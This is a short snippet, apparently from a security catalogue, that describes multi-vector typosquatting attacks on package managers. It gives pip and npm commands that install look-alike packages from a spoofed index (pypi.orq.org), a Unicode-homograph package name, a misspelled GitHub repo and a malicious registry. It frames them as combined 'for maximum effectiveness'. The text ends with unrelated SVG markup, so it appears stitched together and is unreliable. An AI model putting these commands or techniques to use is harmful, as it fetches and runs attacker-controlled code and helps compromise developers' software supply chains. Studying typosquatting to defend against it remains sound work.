**CRITICAL: Multi-Vector Typosquatting**

Combined typosquatting techniques:

1. Similar names to popular packages
2. Unicode homograph characters
3. Common misspellings
4. Spoofed repositories
5. Domain spoofing

```bash
# Unicode homograph + domain spoof
pip install --index-url https://pypi.orq.org tеnsorflow

# Misspelling + repo spoof
npm install git+https://github.com/tensoorflow/tensorflow

# Double char + similar name
pip install nnumpy  # From malicious registry
```

Combines multiple typosquatting vectors for maximum effectiveness.
</metadata><line x1="0" y1="0" x2="100" y2="100"/></svg>
